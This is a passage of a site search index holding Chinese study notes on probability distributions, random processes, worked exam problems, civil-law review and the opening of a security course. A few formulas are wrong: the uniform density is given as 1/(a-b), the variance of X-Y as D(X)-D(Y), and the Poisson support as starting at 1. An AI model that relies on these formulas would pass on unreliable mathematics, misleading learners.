\\frac{t^2}{n})^{-\\frac{n+1}{2}}}, -\\infty \u0026lt; t \u0026lt; +\\infty$$\n性质：\n  若 $$t \\sim t(n)$$，$$E(t) = 0, D(t) = n/(n-2), n \u0026gt; 2$$\n  当 n 充分大时，$$\\displaystyle t \\overset{similarly}{\\sim} N(0,1)$$\n  t 分布的分位点：\n 对于给定的正数 $$\\alpha, 0 \u0026lt; \\alpha \u0026lt; 1$$，称满足条件 $$\\displaystyle P(t \u0026gt; t_{\\alpha}(n)) = \\int_{t_{\\alpha}(n)}^{\\infty} h(t) dy = \\alpha$$ 的点 $$t_{\\alpha}(n)$$ 为 $$t(n)$$ 分布上的 $$\\alpha$$ 分位点。  F 分布 #  定义：\n 设 $$U \\sim \\chi^2(n_1), V \\sim \\chi^2(n_2)$$，U 与 V 相互独立，则称随机变量 $$\\displaystyle F = \\frac{U/n_1}{V/n_2}$$ 服从自由度为 $$n_1$$ 及 $$n_2$$ 的 F 分布，$$n_1$$ 称为第一自由度，$$n_2$$ 称为第二自由度，记作 $$F \\sim F(n_1, n_2)$$  概率密度函数：（懒得抄了，很复杂就对了）\n性质：\n 数学期望为 $$\\displaystyle E(F) = \\frac{n_2}{n_2 - 2}, n_2 \u0026gt; 2$$  它的数学期望不依赖于第一自由度 $$n_1 $$    F 分布的分位数：\n 对于给定的正数 $$\\alpha, 0 \u0026lt; \\alpha \u0026lt; 1$$，称满足条件 $$\\displaystyle P(F \u0026gt; F_{\\alpha}(n_1,n_2)) = \\int_{F_{\\alpha}(n_1,n_2)}^{\\infty} \\varphi(y) dy = \\alpha$$ 的点 $$F_{\\alpha}(n_1, n_2)$$ 为 $$F_{\\alpha}(n_1, n_2)$$ 分布上的 $$\\alpha$$ 分位点。 有一个性质：$$\\displaystyle F_{1 - \\alpha}(n_1, n_2) = \\frac{1}{F_{\\alpha}(n_2, n_1)}$$  抽样分布定理 #  设总体 X 的均值为 $$\\mu$$，方差为 $$\\sigma^2$$，$$X_1, X_2, \u0026hellip;, X_n$$ 是来自总体的一个样本，则样本均值 X 和样本方差 $$S^2$$ 有：\n $$\\displaystyle E(\\overline{X}) = \\mu, D(\\overline{X}) = \\frac{\\sigma^2}{n}, E(S^2) = \\sigma^2$$  样本均值的分布 #  设 $$X_1, X_2, \u0026hellip;, X_n$$ 是来自总体 $$N(\\mu, \\sigma^2)$$ 的一个样本，$$\\overline{X}$$ 是样本均值，\n则有：$$\\displaystyle \\overline{X} \\sim N(\\mu, \\frac{\\sigma^2}{n})$$\n样本方差的分布 #  设 $$X_1, X_2, \u0026hellip;, X_n$$ 是来自总体 $$N(\\mu, \\sigma^2)$$ 的一个样本，$$\\overline{X}$$ 和 $$S^2$$ 分别是样本均值和样本方差，则有：\n $$\\displaystyle \\frac{(n-1) S^2}{\\sigma^2} \\sim \\chi^2(n-1)$$ $$\\overline{X}$$ 与 $$S^2$$ 独立  （后面的懒得看了）\n"},{"id":181,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83/","title":"随机变量的分布","section":"概率论","content":"常见概率分布总结：\n   分布名称 记号 分布律或概率密度函数 数学期望 方差     两点分布 $$X \\sim (0-1)$$ $$P(X = x) = p^{k}q^{1-k}$$\n$$x \\in {0,1}, 0 \\lt p \\lt 1, q = 1-p$$ $$p$$ $$pq$$   二项分布 $$X \\sim B(n, p)$$ $$P(X = k) = C_n^kp^kq^{n-k}$$\n$$k \\in {0, 1, \u0026hellip;, n}, 0 \\lt p \\lt 1, q = 1-p$$ $$np$$ $$npq$$   泊松分布 $$X \\sim P(\\lambda)$$ $${\\displaystyle P(X = k) = \\frac{\\lambda^k}{k!}e^{-\\lambda}, k \\in {1,2,\u0026hellip;}, \\lambda \u0026gt; 0}$$ $$\\lambda$$ $$\\lambda$$   均匀分布 $$X \\sim U[a,b]$$ $$\\displaystyle f(x) = \\begin{cases}\\displaystyle \\frac{1}{a-b} \u0026amp;, a \\le x \\le b \\ 0 \u0026amp;, others \\end{cases}$$ $$\\displaystyle \\frac{a+b}{2}$$ $$\\displaystyle \\frac{(b-a)^2}{12}$$   指数分布 $$X \\sim E(\\lambda)$$ $$\\displaystyle f(x) = \\begin{cases} \\lambda e^{-\\lambda x} \u0026amp;, x \u0026gt; 0 \\ 0 \u0026amp;, x \\le 0 \\end{cases}$$ $$\\displaystyle \\frac{1}{\\lambda}$$ $$\\displaystyle \\frac{1}{\\lambda^2}$$   正态分布 $$X \\sim N(\\mu, \\sigma^2)$$ $$\\displaystyle f(x) = \\frac{1}{\\sqrt{2 \\pi} \\sigma} e^{-\\frac{(x - \\mu)^2}{2 \\sigma^2}}, \\sigma \u0026gt; 0$$ $$\\mu $$ $$\\sigma^2$$    "},{"id":182,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%9A%8F%E6%9C%BA%E8%BF%87%E7%A8%8B/","title":"随机过程","section":"概率论","content":"随机过程 #  定义 #  随机过程（Stochastic Process）的定义：\n 设随机试验 E 的样本空间 $$S \\in {\\xi}$$ 若对于每个元素 $$\\xi \\in S$$ 总有一个确知的时间函数 $$X(t, \\xi) t \\in Ts,$$ 与它对应，对于所有的，就可以得到一簇时间 t 的函数，称它为随机过程。簇中的每一个函数称为样本函数。 若对于每个特定的时间 $$t_i(i = 1,2,\u0026hellip;)$$，都是随机变量，则称 $$X(t, \\xi)$$ 为随机过程，$$X(t_i, \\xi)$$称为随机过程 $$X(t)$$ 在 $$t = t_i$$ 时刻的状态。  即有：\n   $$X(t, \\xi)$$ t 固定 t 可变     $$\\xi $$ 固定 确定值 时间函数   $$\\xi $$ 可变 随机变量 随机过程    概率分布 #  一维概率分布 #  记 $$F(x_i; t_i) = P(X(t_i) \\le x_i )$$ 为随机过程 $$X(t)$$ 的一维分布函数。若 $$F(x, t)$$ 的偏导数存在，则有 $$\\displaystyle f_X(x_i, t_i) = \\frac{\\part F_X(x_i, t_i)}{\\part x_i}$$\n二维概率分布 #  为了描述 S，P 在任意两个时刻 $$t_1$$ 和 $$t_2$$ 的状态间的内在联系,可以引入二维随机变量 $$[X(t_1),X(t_2)]$$ 的分布函数$$F_X(x1,x2;t1,t2)$$，它是二随机事件 $${X(t_1) \\le x_1}, {X(t_2) \\le x_2 }$$ 同时出现的概率，\n即：$$F_X(x1,x2;t1,t2) = P(X(t_1) \\le x_1, X(t_2) \\le x_2)$$ 称为随机过程 $$ X(t) $$ 的二维分布函数。\n若 $$F_X(x1,x2;t1,t2)$$ 对 $$x_1, x_2$$ 的混合偏导存在，则称：$$\\displaystyle f_X(x1,x2;t1,t2) = \\frac{\\part^2F_X(x1,x2;t1,t2)}{\\part x_1 \\part x_2}$$ 为随机过程 $$X(t)$$ 的二维概率密度。\nn 维概率分布 #  （懒得写了）\n数字特征 #    均方值与方差：\n  把 $$X(t)$$ 二阶原点矩称为随机过程的均方值。即：$$\\displaystyle \\Psi^2_X(t) = E(X^2(t)) = \\int_{-\\infty}^{+\\infty} x^2f_X(x;t)dx$$\n  把 $$X(t)$$ 二阶中心矩称为随机过程的方差。即：$$\\displaystyle \\sigma^2_X(t) = D(X(t)) = E(X^2(t)) - E^2(X(t)) = \\Psi^2_X(t) - \\mu_X^2(t)$$\n    自相关函数：\n 对于随机过程 $$X(t) $$，定义其自相关函数：$$\\displaystyle R_{XX}(t_1, t_2) = E(X(t_1)X(t_2))$$ $$t_1 = t_2$$ 时的自相关函数是随机过程的均方值。    自协方差函数:\n  对于随机过程 $$X(t) $$，定义其自协方差函数：$$C_{XX}(t_1, t_2) \\ = E[(X(t_1) - \\mu_X(t_1))(X(t_2) - \\mu_X(t_2))] \\ = R_X(t_1, t_2) - \\mu_X(t_1)\\mu_X(t_2)$$\n  $$t_1 = t_2$$ 时的自相关函数是随机过程的方差。\n    互相关函数:\n 对于不同的随机过程 $$X(t)$$ 和 $$Y(t)$$，则定义其互相关函数：$$R_{XY}(t_1, t_2) = E[X(t_1)Y(t_2)]$$    互协方差函数：\n  对于不同的随机过程 $$X(t)$$ 和 $$Y(t)$$，则定义其互协方差函数：$$C_{XY} (t_1, t_2) = E[(X(t_1) - \\mu_X(t_1))(Y(t_2) - \\mu_Y(t_2))]$$\n  可以证明：$$C_{XY}(t_1, t_2) = R_{XY}(t_1, t_2) - \\mu_X(t_1)\\mu_Y(t_2)$$\n    "},{"id":183,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%A2%98%E7%9B%AE%E7%B2%BE%E8%A7%A3/","title":"题目精解","section":"概率论","content":"题目 #  判断题 #  1 #   设有分布律 $${\\displaystyle P(X = (-1)^{n+1} \\frac{2^n}{n}) = \\frac{1}{2^n}}$$，则 X 的数学期望存在。\n  错误。\n 数学期望定义：\n  设离散型随机变量 X 的分布律为：$$P(X = x_k) = p_k$$\n若级数 $${\\displaystyle \\sum_{k=1}^{\\infin} x_k p_k}$$ 绝对收敛，则称 $${\\displaystyle \\sum_{k=1}^{\\infin} x_k p_k}$$ 的和为随机变量 X 的数学期望，记为 $$E(X)$$\n即有：$$E(X) = {\\displaystyle \\sum_{k=1}^{\\infin} x_k p_k}$$\n  设连续型随机变量 X 的概率密度为 f(x)\n若积分 $${\\displaystyle \\int_{-\\infty}^{\\infty} x f(x) dx}$$ 绝对收敛，则称积分 $${\\displaystyle \\int_{-\\infty}^{\\infty} x f(x) dx}$$ 的值为随机变量 X 的数学期望，记为 $$E(X)$$\n即 $$E(X) ={\\displaystyle \\int_{-\\infty}^{\\infty} x f(x) dx}$$\n  注意到，数学期望要求绝对收敛，原因：https://math.stackexchange.com/questions/239949/why-do-we-require-absolute-convergence-in-the-definition-of-expectation\n2 #   在假设检验中，显著性水平 $$\\alpha$$ 是指：$$P(拒绝 H_0 \\mid H_0 为假) = 1 - \\alpha$$\n  错误。\n 概念：\n  $$H_0$$ 原假设或零假设\n  $$H_1$$ 备选假设或对立假设\n  $$\\alpha $$ 是犯弃真错误的概率\n  $$\\beta$$ 是犯取伪错误的概率\n  即如下表格：\n    $$H_0$$ 成立 $$H_1$$ 成立     接收 $$H_0$$ 不犯错 第 II 类错误（取伪错误 $$\\beta$$）   拒绝 $$H_0$$ 第 I 类错误（弃真错误 $$ \\alpha $$） 不犯错    选择题 #  1 #   设二维随机变量 $$(X,Y) \\sim N(0, 0.5; 0, 0.5; 0)$$，$$Z = X - Y$$，则方差 $$D(|Z|)$$ 等于：\nA. 0\tB. 1\tC. $$1 + {\\displaystyle \\frac{2}{\\pi}}$$\tD. $$1 - {\\displaystyle \\frac{2}{\\pi}}$$\n  D\n $$\\rho = 0 \\Rightarrow Cov(X, Y) = 0 \\Rightarrow E(XY) - E(X)E(Y) = 0 \\Rightarrow$$ X，Y 相互独立\n$$E(Z) = E(X) - E(Y) = 0, D(Z) = D(X) - D(Y) = 1 \\Rightarrow Z \\sim N(0,1)$$\n因此可以求出：\n$${\\displaystyle E(|Z|) = \\int_{-\\infty}^{+\\infty}|z|\\cdot \\frac{1}{\\sqrt{2 \\pi}}e^{-\\frac{z^2}{2}} dz}$$\n $${\\displaystyle = \\frac{2}{\\sqrt{2 \\pi}} \\cdot \\int_0^{+\\infty} z \\cdot e^{-\\frac{z^2}{2}} dz}​$$\n $${\\displaystyle = \\frac{2}{\\sqrt{2 \\pi}} \\cdot (-e)^{-\\frac{z^2}{2}} \\Big|_0^{+\\infty} = \\sqrt{\\frac{2}{\\pi}} }$$\n$${\\displaystyle E({|Z|}^2) = \\int_{-\\infty}^{+\\infty}z^2 \\cdot \\frac{1}{\\sqrt{2 \\pi}}e^{-\\frac{z^2}{2}} dz }$$\n $${\\displaystyle= - \\frac{z}{\\sqrt{2 \\pi}} \\cdot e^{-\\frac{z^2}{2}} \\Big|{-\\infty}^{+\\infty} + \\int{-\\infty}^{+\\infty} \\frac{1}{\\sqrt{2 \\pi}}e^{-\\frac{z^2}{2}} dz}$$\n $${\\displaystyle = 0 + 1 = 1 }$$\n$${\\displaystyle D(|Z|) = E(|Z|^2) - (E(|Z|))^2 = 1 - \\frac{2}{\\pi} }$$\n2 #   设总体 $$X \\sim N(\\mu, \\sigma^2)$$，$$\\mu$$ 为未知参数，样本 $$X_1, X_2, \u0026hellip;, X_n$$ 的方差为 $$S^2$$，对于假设检验 $$H_0: \\sigma \\ge 2, H_1: \\sigma \\lt 2$$，显著性水平 $$\\alpha$$ 的拒绝域为：\n$$(A). {\\displaystyle \\chi^2 = \\chi_{1 - \\frac{\\alpha}{2}}^2(n-1)}$$\n$$(B). {\\displaystyle \\chi^2 = \\chi_{1 - \\alpha}^2(n-1)}$$\n$$(C). {\\displaystyle \\chi^2 = \\chi_{1 - \\frac{\\alpha}{2}}^2(n)}$$\n$$(D). {\\displaystyle \\chi^2 = \\chi_{1 - \\alpha}^2(n)}$$\n  B\n 因为 $$\\mu$$ 未知，所以检验所用的统计量以及其服从的分布是：\n$${\\displaystyle \\chi^2 = \\frac{(n-1)S^2}{\\sigma_0^2} \\sim \\chi^2(n-1)}$$\n"},{"id":184,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%B0%91%E6%B3%95%E6%80%BB%E8%AE%BA/%E6%B0%91%E6%B3%95%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/","title":"民法期末复习","section":"民法总论","content":"民法总论期末复习 #  第一章 导论 #  第3节 民法的本质 #   民法的基本原理，私法自治原则。  私法自治，也称意思自治，指经济生活和家庭生活中一切民事权利义务关系的设立、变更和消灭，均有当事人自己决定，一般国家不作干预。 私法自治的功能：(1)排除个人束缚; (2)废除特权; (3)保障私有财产; (4)维护个人自由、尊严。 私法自治原则的限制    第4节 民法的本位 #   近代民法为权利本位：法律之基本任务，由使人尽其义务保护权利，为使权利之内容得以实现，方有义务之履行，是为权利本位。其体现在近代民法三大原则之中：  契约自由原则 所有权绝对原则 自己责任原则   社会本位：为使社会共同生活之增进，法律即强使人负担特定之义务，限制或剥夺其某种权利，此为私法自治之限制，是为社会本位。  契约自由的限制 所有权绝对原则之限制 无过错责任原则之采用    第5节 民法的基本原则 #   中国民法的基本原则  平等原则：指在民事活动中一切当时人法律地位平等，任何一方不得把自己的意志强加给对方。  基本含义：给予他人以相同对待；尊重对方的主体性。 具体表现：民事主体的资格平等；民事主体的地位平等；民事主体的民事权益平等的受法律保护。   合同自由原则：指参加民事活动的当事人在法律允许的范围内享有完全的自由，按照自己的自由意思决定缔结合同关系，为自己设定权利或对他人承担义务，任何机关、组织和个人不得非法干预。 公平原则：指法律行为内容的确定，应当遵循公平的原则。公平原则的体现  权利与义务的平衡 行为与责任的平衡 收益与风险的平衡 利益与贡献的平衡   诚实守信原则：指民事主体在进行民事活动时，应诚实不欺、恪守诺言，并且合理、善意的方式行使权利、履行义务。 公序良俗原则：是指民事主体的行为应遵守公共秩序，符合善良风俗，不得违法国家的公共秩序和社会的一般道德。违反公序良俗的具体表现有：  危害国家 危害家庭关系 违反性道德的行为 射幸行为（所谓射幸合同是指当事人一方是否履行义务有赖于偶然事件的出现的一种合同） 违反人权和人格尊严的行为 限制经济自由的行为 违反公平竞争的行为 违反消费者保护的行为 违反劳动者保护的行为 暴利行为   权利滥用之禁止行为：指一切民事权利之行使，不得超过其正当界限致有损他人利益或社会公益，行使权利超过七正当界限，则构成权利滥用，应当承担民事责任。  权利滥用的构成的条件：有权利的存在，有行使权利的行为，有滥用权利的违法性（即对他人造成了不当损害） 主观方面：权利人的主观目的主要是为了损害他人；客观方面：权利人的行为产生损害他人利益的行为。      第6节 民法与邻近法律部门 #   法律体系：  财产权：  债权：合同、侵权行为、无因管理、不当得利 物权：所有权、他物权（用益物权、担保物权） 知识产权：著作权、工业产权（商标权、专利权（发明、使用新型、外观设计））、其他   人身权：  人格权：  一般人格权：给予人格独立、自由、平等和尊严这些一般人格利益而享有的权利 具体人格权（生命权、健康权、身体权、姓名权、肖像权、名誉权）   身份权：  亲属法上的身份权：亲权、亲属权、配偶权 非亲属法上的身份权：荣誉权        第二章 民事法律关系 #  第2节 民事法律关系的要素 #   民事法律关系的构成：主体、客体、内容 民事法律关系的主体：指参与民事法律关系享有民事权利承担民事义务的法律资格，或指享有民事权利能力的人。 民事法律关系的客体：指民事法律关系的主体享有的权利和承担的义务所指向的事物。 民事法律关系的内容：指民事法律关系的主体所享有的民事权利和负有的民事义务。 民事法律关系的事实：民事法律事实，指依法能够引起民事法律关系发生、变更、消灭的客观情况。  根据是否与人的意志有关，可将民事法律事实区分为自然事实与行为。    第3节 民事能力 #   民事权利能力的概念：根据以充当民事主体，享受民事权利和承担民事义务的法律地位或法律资格。 民事行为能力：指民事主体根据以独立参加民事法律关系，以自己的法律行为取得民事权利或承担民事义务的法律资格。  意思能力：指自然人认识自己的行为的动机与结果，并根据此认识决定其正常的意思之能力。意思能力为法律赋予自然人民事行为能力之前提。   民事责任能力：指民事主体据以独立承担民事责任的法律地位或法律资格 民事行为能力与民事责任能力比较：  目的不同，民事行为能力的目的在于使主体可以按照自己的意思追求自身利益，民事责任能力的目的则在于对主体的违法行为追究民事责任，保护他人和社会利益； 效力不同，民事行为能力为决定民事法律行为是否有效的根据，民事责任能力为决定主体是否自己承担民事责任的根据； 性质不同，民事行为能力是具体的，有一定范围；民事责任能力是抽象的，无一定范围。    第4节 民事权利 #   民事权利的特点  民事权利是一种由民法确定的权利； 民事权利是由民事主体享有的一种权利； 民事权利体现为民事主体一定范围内的行为自由； 权利在性质上是一种法律之上的力； 权利是类型化的利益。   权利的分类  根据：公权、私权。 标的：财产权（可以与权利人的人格、身份相分离而具有财产价值的权利）、非财产权。 作用：支配权、请求权、形成权（指当事人一方依据自己的行为，是自己与他人法律关系发生变动的权利。形成权的行使不得附条件或附期限，其行使不得撤销）、抗辩权（权利人用以对抗他人请求权或否认对方权利主张的权利） 效力所及范围：绝对权（对世权）、相对权（对人权） 相互关系：主权利、从权利 与权利主体关系：专属权、非专属权 是否具备全部成立条件：既得权、期待权   民事权利的取得  民事权利的原始取得：指民事权利独立地、不依附与既存之其他权利而发生 民事权利的继受取得：基于他人既存权利而发生权利，或称为民事权利的传来取得。分为转移的继受取得与设定的继受取得。   民事权利的变更  民事权利主体之变更 民事权利内容之变更   民事权利的消灭：分为绝对消灭与相对消灭 民事权利的保护：  民事权利的自我保护，或称为民事权利的私力救济：指权利人自己采取各种合法手段来保护自己的权利不受侵犯。包括：正当防卫、紧急避险、自助行为。 民事权利的国家保护，又称公力救济：指权利受到侵犯是，由国家机关给予保护。确认之诉、给付之诉、形成之诉。   权利竞合  第6节 民事责任 #   民事责任的本质：  民事责任为民事法律构成之要素 民事责任使民事权利具有法律之上的力 民事权利是连接民事权利与国家公权力之中介 民事责任是一种特别债   民事责任与其他法律责任的区别     内容 民事责任 其他责任     产生根据 法定或约定 法定   法律强制程度 权利人自主决定追究或免除 由国家机关强制追究，非经法定程序不得免除   目的和性质 以填补损害为目的，补偿性 以预防为目的，具有惩罚性   构成要件 既有过错责任也有非过错责任 责任人均须有过错   → 一般要求损害事实发生 不要求实际损害发生   → 存在替代责任 责任自负     一些责任的概念：  共同责任：可以分为按份责任、连带责任和补充责任 按份责任：指多数当事人按照法律的规定或者合同的约定各自承担一定份额的民事责任，各责任人之间没有连带关系。 连带责任：因违反连带债务或者共同事实侵权行为而产生的责任，各个责任人之间具有连带关系。 补充责任：指责任人的财产不足以承担其应负的民事责任时，有有关的人对不足的部分依法语义补充的责任。 不真正连带责任：指各债务人基于不同的发生原因而对于同一债权人负有以同一给付为标的的数个债务，因一个债务人的履行而使全体债务均归于消灭，此时数个债务人之间所负的责任即为不真正连带责任。    第3章 民事主体（自然人） #  第2节 人格权 #   人格权：指存在于权利人自身人格上的权利，亦即以权利人自身的人格利益为标的之权利。人格权不得转让与放弃。  第3节 民事行为能力 #   民事行为能力：自然人能以自己的行为享有民事权利、承担民事义务的资格。 完全民事行为能力：自然人具有的完全独立地通过自己的行为取得民事权利和承担民事义务的资格。包括：  18周岁以上的成年人 16周岁以上不满18岁，以自己的劳动收入为主要生活来源，并能维持当地群众一般生活水平的自然人   限制民事行为能力：指自然人具有的可以通过自己的行为取得部分民事权利和承担部分民事义务的资格。限制民事行为能力人，可以进行与其年龄、智力或精神健康状况相适应的民事活动；其他民事活动由其法定代理人代理，或者征得其法定代理人的同意。包括：  10周岁以上的未成年人 不能完全辨认自己行为的精神病人（包括痴呆人）   无民事行为能力：指自然人不具有自己的行为取得民事权利和承担民事义务的资格。无民事行为能力人的民事行为，应由其法定代理人进行。包括如下两类自然人。包括：  不满10周岁的未成年人； 不能辨认自己行为的精神病人。    第4节 监护 #   监护：指为无民事行为能力人和限制民事行为能力人设置保护人，以监督和保护其人身、财产以及其他合法权益的制度。监护特点如下：  被监护人只能是无民事行为能力人和限制民事行为能力人。 监护人只能是完全民事行为能力人和有监护条件的组织。 监护的目的，在于弥补无民事行为能力人和限制民事行为能力人在民事行为方面的不足或缺陷。   协议监护与委托监护  协议监护，是指由有监护资格的人协商确定监护人的监护。有监护资格的人之间协议确定监护人的，应当由协议确定的监护人对被监护人承担责任。 委托监护，是指监护人将监护职责委托给他人所产生的监护。监护人可以将监护责任部分或全部委托给他人。因被监护人的侵权行为需要承担民事责任的，应当由监护人承担，但当事人另有约定的除外。只有在被委托人确有过错的情况下，才负连带责任。    第5节 宣告失踪制度 #   宣告失踪：指经利害关系人申请，由法院对下落不明满一定期限的自然人宣告为失踪人的制度。 宣告失踪的条件，法律后果，撤销  第6节 宣告死亡制度 #   宣告死亡：指自然人下落不明达到法定期限，经利害关系人申请，由法院宣告其死亡的制度。 宣告死亡的条件，法律后果，撤销。  第4章 民事主体（法人） #  第1节 法人的概念 #   法人：是指具有民事权利能力和民事行为能力，依法独立享有民事权利和承担民事义务的组织。法人的民事权利能力和民事行为能力，从法人成立时产生，到法人终止时消灭。 法人的特征：  独立的组织。法人的民事主体资格与组成法人的自然人的民事主体资格彼此独立，某个或某些法人成员的死亡或退出法人组织，不影响法人的存续；法人的组织无需依靠其他组织或单位而独立存在。 独立的财产。法人所有或经营管理的全部财产独立于其出资者的其他财产，法人享有独立财产权。 独立的责任。法人以自己的名义进行民事活动，独立享有民事权利承担民事义务。如果法人违反民事义务，由法人独立承担民事责任。法人的财产不足以清偿债务时，法人出资者一般不承担责任。    第4节 法人的民事能力 #   法人的民事权利能力：是指法人以自己的名义独立享受民事权利和负担民事义务的资格。具有如下特点：  法人的民事权利能力始于成立、终于消灭。 法人民事权利能力受法人自然属性的限制。法人是社会组织，具有团体性，因而法人不享有自然人基于自然属性所享有的权利，如生命权、健康权等，当然法人也不可能享有婚姻能力等。 法人的民事权利能力受法人宗旨的限制，但除国家限制经营、特许经营和禁止经营外，法人超越其经营范围的民事行为并非一定无效。   法人的民事行为能力：是指法人通过自己的行为取得民事权利和承担民事义务的资格。具有如下特点：  法人的民事行为能力，与其民事权利能力同时产生、同时消灭，在存续时间上具有一致性。 法人的民事行为能力，与其民事权利能力在范围上具有一致性。 法人的民事行为能力，是通过法定代表人和其他法人机关成员来实现的。   代表说与代理说   法人的民事责任能力：是指法人对自己所为的违法行为承担法律责任的能力或资格。具有如下特点：  法人的责任能力与法人的权利能力同时产生、同时消灭，而且其范围是一致的。 法人，只对法定代表人、法人机关及工作人员在其权利能力范围内所为职务违法行为承担民事责任。法人的责任能力，包括法人的违约责任能力和法人的侵权责任能力。   法人承担法律责任需满足以下要件：须有加害他人的侵权行为；须因法人的代表人或其他工作人员的行为；须因执行职务的行为所发生。  第6章 法律行为 #  第1节 法律行为的概念 #   法律行为：又称民事行为，是指民事主体实施的以发生民事法律后果为目的、以意思表示为要素的行为。 法律行为的分类  意思表示状况：双方行为、单方行为和多方行为。 依据法律是否须依法律规定的特定方式为之：要式行为、不要式行为。 依据法律行为的成立除意思表示外，是否以标的物的实际交付为要件：要物行为、不要物行为。 发生效力时间：生前行为、死因行为。 法律后果性质：财产行为、身份行为。 财产行为效果的不同：负担行为、处分行为。 法律行为内容的不同：债权行为、物权行为。 法律行为是否有对价：有偿行为、无偿行为。 行为之间的关系：主行为、从行为。 法律行为是狗有独立的实质内容：独立行为、补助行为。 行为和原因之间的关系：有因行为、无因行为。    第3节 法律行为的要件 #   法律行为的成立要件：包括一般成立条件和特别成立条件  一般成立条件：任何法律行为成立都必不可少的共同要件。包括：  须有行为人 须有意思表示。意思+表示 须有标的。标的即表示的内容，是行为人实施法律行为所要达到的效果。   特别成立条件，指一些特别的法律行为成立所须具备的特殊条件。   法律行为的生效要件，包括一般生效要件和特别生效要件  一般生效要件：  行为人具有相应的民事行为能力； 意思表示真实； 标的须合法； 标的须可能和确定。   特别生效要件，是指一些特殊的法律行为除具备一般生效要件外，还须具备的生效要件。   法律行为的标的：是指法律行为的内容。法律行为的成立，以有标的为成立要件。包括：  标的合法，是指不违反法律强行性规定及公序良俗。 标的确定，是指标的须自始确定。否则无效。    第4节 意思表示 #   意思表示：指向外部表明意欲发生一定私法上的法律效果之意思的行为。 意思表示的构成要素：效果意思、表示意思和表示行为。  效果意思：指表示上的效果意思，即从书面形式或口头形式的表示行为所推断出的效果意思。 表示行为：指以书面形式或口头形式将意思外部化的行为。    第5节 意思与表示不一致 #   故意的不一致  真意保留：指表意人故意隐匿其真意，而表示与其真意不同之意思的意思表示。  须有意思表示 须表示与真意不符 须表意人明知其表示与真意不符   真意保留原则上有效，但其不一致为相对人所明知者，应无效。   虚伪表示：指表意人与相对人通谋而为之虚假的意思表示。  须有意思表示 须表示与真意不符 须表意人与相对人通谋   虚伪表示原则上无效，但不得以其无效对抗善意第三人。   隐藏行为:指隐藏于虚伪表示中依其真意所欲发生的法律行为。 脱法行为:指以迂回手段规避强行规定之行为。   无意的不一致  错误:指表意人因误认或不知，致其意思与表示不一致。  错误的意义:  须表示与意思不一致 须其不一致出于表意人之误认或不知   错误的分类  关于当事人本身的错误 关于标的物本身之错误 关于当事人资格之错误 关于标的物性质之错误 关于法律行为性质之错误 关于价格、数量、履行地、履行期之错误 关于动机之错误   错误的效力:日本民法规定为无效；德国、台湾民法规定为可撤销。   误传:指因传达人或传达机关之错误致表示与意思不符。传达人和传达机关在法律上相当于表意人之喉舌，因此误传之效力与错误同。   胁迫:指以不法加害威胁他人，使其产生恐惧心理，并基于恐惧心理而为意思表示之行为。  胁迫的构成要件  须有胁迫之故意 须有胁迫行为 须其胁迫为非法 须被胁迫人因受胁迫而生恐惧心理 须被胁迫人基于恐惧心理而为意思表示   胁迫的效力:不论胁迫人是否为对方当事人，表意人均得撤销其意思表示，并且此撤销得对抗善意第三人。    第7章 代理 #  第1节 代理的概念 #   代理：指一人代另一人为法律行为，其所产生的法律效果直接归属所带的另一个人。 狭义代理：指代理人以本人名义为法律行为，而使其法律效果直接归属于本人。 广义代理：代理人以本人名义或以自己名义，代本人为法律行为，而使所产生的法律效果直接或间接归属于本人。  第2节 代理关系 #   本人：指借助于代理人的代理行为同相对人发生民事法律关系的人。 代理人：指代本人实施民事法律行为的人。 相对人：指由代理人的代理行为而与本人发生民事法律关系的对方当事人。  第5节 代理行为 #   代理行为的成立要件  一般成立要件 特殊成立要件  是否以本人名义 须代理人实施民事法律行为     代理行为的生效要件  须具备一般民事的生效要件  关于权利能力之有无，应就本人决定之。 关于行为能力之有无，应就代理人决定之。 关于意思表示之是否真实，是否有瑕疵，应就代理人决定之。 关于行为内容和目的是否违法，应就代理人与本人双方决定之。只要其中一方有违法目的，代理行为即应无效。   须有本人存在 须有代理权    第8章 诉讼时效 #  第1节 时效的概念 #   时效，指一定事实状态在法定期间持续存在，从而产生与该事实状态相适应的法律效果的法律制度。民法关于时效的规定，属于强行性规定，构成民事权利的限制。 时效制度的重大功能  稳定法律秩序 作为证据之代用 促使权利人行使权利    第4节 诉讼时效的期间 #   民法通则规定了三种时效期间，即普通时效期间为2年，特别时效期间为1年，最长时效期间为20年。 诉讼时效期间的中止:指在时效期间行将完成之际，有与权利人无关的事由而使权利人无法行使其请求权，法律为保护权利人而使时效期间暂停计算，待中止事由消灭后继续计算。  时效期间中止的条件  有权利人不能行使其请求权的障碍，包括不可抗力及其他障碍。 此障碍发生在2年的普通时效期间或1年的特别时效期间的最后6个月内。     诉讼时效期间的中断:中断，指在有法定事由发生时，此前已计算的时效期间全归无效，待中断事由消灭后时效期间重新计算。  时效期间中断的法定事由  起诉 以其他方式主张权利 义务人同意履行义务     中断与中止的区别：  发生中止的原因属于与当事人无关的客观情况，而发生中断的原因系当事人的行为，亦即取决于当事人的意思。 在时效期间中止，中止以前已经进行的时效期间为有效，应与中止原因消灭后继续计算的时效期间合并计算；在时效期间中断，中断以前已经进行的时效期间为无效，中断原因消灭后重新计算时效期间。 在时效期间中止，中止原因应发生在时效期间的最后6个月内，才能发生中止的效力；在时效期间中断，中断原因无论发生在时效期间的哪一段，均应发生中断的效力。    "},{"id":185,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1.introduction/","title":"1. Introduction","section":"算法和协议中的安全机制","content":"Chapter 1. Introduction #  Terminologies in this Class:\n Confidentiality, Integrity, Authenticity etc. 安全三要素：保密性、完整性、认证性（真实性）  Communication System Security #  Communication system security is achieved in two aspects:\n Make each node a trusted platform: robust hardware, validated system software, authorized applications. Protect communications on each link: mutual authentication, 